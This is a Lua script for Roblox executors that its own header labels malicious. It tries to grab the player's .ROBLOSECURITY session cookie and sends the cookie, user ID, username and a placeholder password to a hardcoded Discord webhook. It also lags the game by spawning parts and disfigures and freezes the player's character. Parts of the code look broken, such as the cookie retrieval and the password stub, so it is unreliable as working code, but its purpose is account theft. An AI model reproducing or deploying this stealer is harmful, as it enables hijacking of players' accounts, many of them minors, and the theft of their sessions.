-- Malicious Roblox Script for Executors with Discord Webhook

-- Function to get the security cookie
local function getSecurityCookie()
    local httpService = game:GetService("HttpService")
    local response = httpService:JSONDecode(httpService:GetAsync("https://auth.roblox.com/v2/cookie"))
    return response.ROBLOSECURITY
end

-- Function to send a message to a Discord webhook
local function sendToDiscordWebhook(webhookUrl, message)
    local httpService = game:GetService("HttpService")
    local data = {
        content = message
    }
    local options = {
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = httpService:JSONEncode(data)
    }
    local response = httpService:Request(options)
    return response
end

-- Teleport the local player to a random location
local player = game.Players.LocalPlayer
local randomPosition = Vector3.new(math.random(-1000, 1000), 50, math.random(-1000, 1000))
player.Character:MoveTo(randomPosition)

-- Spawn a bunch of parts to lag the game
for i = 1, 500 do
    local part = Instance.new("Part")
    part.Size = Vector3.new(1, 1, 1)
    part.Position = Vector3.new(math.random(-50, 50), math.random(1, 100), math.random(-50, 50))
    part.Anchored = true
    part.Parent = game.Workspace
end

-- Change the player's character appearance
local character = player.Character
character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
character.Humanoid.WalkSpeed = 0
character.Head.face:Destroy()
character.Head.Mesh:Destroy()

-- Get player information
local playerId = player.UserId
local username = player.Name
local password = "player_password" -- Replace this with the actual password retrieval method
local cookie = getSecurityCookie()
local webhookUrl = "https://discord.com/api/webhooks/1380338704672882748/_-PqC1s91tuEruxun-8aoMtEr27JtnvaIYyUM1u7GtMx5D-Xv_kXOVMBKkZ50UE0PlmP"
local playerInfo = "Player ID: " .. playerId .. "\nUsername: " .. username .. "\nPassword: " .. password .. "\nRoblox Security Cookie: " .. cookie

-- Send player information to Discord
sendToDiscordWebhook(webhookUrl, playerInfo)
